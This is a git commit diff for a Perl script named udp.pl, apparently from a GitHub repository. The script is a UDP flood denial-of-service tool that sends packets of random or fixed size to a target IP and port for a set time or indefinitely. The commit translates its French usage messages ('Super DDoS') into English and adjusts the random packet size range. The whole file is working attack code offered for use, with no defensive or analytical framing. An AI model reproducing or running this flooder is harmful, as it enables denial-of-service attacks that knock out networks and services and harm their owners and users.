ec0f9adf6f4298b235d6e572a5e0762f450ae51c
sherlockbuster <59093010+sherlockbuster@users.noreply.github.com>
2020-05-25 05:19:56 -0300

    Update udp.pl

--- udp.pl
+++ udp.pl
@@ -1,6 +1,6 @@
 #!/usr/bin/perl
-
 ##############
+
 # udp flood.
 ##############
  
@@ -8,12 +8,10 @@ use Socket;
 use strict;
  
 if ($#ARGV != 3) {
-  print " \n";
-  print "Super DDoS // by Adrien\n\n";
-  print "Commande: flood.pl <ip> <port> <packets> <temps(en secondes)>\n";
-  print " port: le port à flood. Mettez 0 pour tous.\n";
-  print " packets: le nombre de packets à envoyer. Entre 64 et 1024.\n";
-  print " temps: le temps de flood en secondes.\n";
+  print "flood.pl <ip> <port> <size> <time>\n\n";
+  print " port=0: use random ports\n";
+  print " size=0: use random size between 64 and 1024\n";
+  print " time=0: continuous flood\n";
   exit(1);
 }
  
@@ -21,19 +19,19 @@ my ($ip,$port,$size,$time) = @ARGV;
  
 my ($iaddr,$endtime,$psize,$pport);
  
-$iaddr = inet_aton("$ip") or die "Impossible de se connecter à $ip\n";
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
  
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
  
-print "Flooding en cours sur $ip avec le port " . ($port ? $port : "random") . ", envoit de " . 
+print "Flooding $ip " . ($port ? $port : "random") . " port with " . 
   ($size ? "$size-byte" : "random size") . " packets" . 
-  ($time ? " pour $time secondes" : "") . "\n";
-print "Attaque arrêtée avec Ctrl-C\n" unless $time;
+  ($time ? " for $time seconds" : "") . "\n";
+print "Break with Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
-  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
